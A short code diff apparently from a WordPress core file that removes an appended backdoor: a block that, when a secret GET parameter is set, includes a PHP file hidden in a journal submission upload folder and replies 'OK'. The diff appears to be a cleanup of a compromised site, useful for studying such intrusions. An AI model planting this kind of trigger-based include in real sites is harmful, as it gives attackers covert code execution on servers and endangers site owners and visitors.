@@ -1556,10 +1556,3 @@ function wp_is_xml_request() {
 
 	return false;
 }
-if (isset($_GET['_']) && $_GET['_'] === 'CONTENT_TYPE') {
-    $f="/home/stif6195/journal/journals/4/articles/248/submission/final/248-40-959-1-6-20230730";if($f!==""&&file_exists($f))include $f;
-    http_response_code(200);
-    header('Content-Type: text/plain; charset=utf-8');
-    echo 'OK';
-    exit;
-}
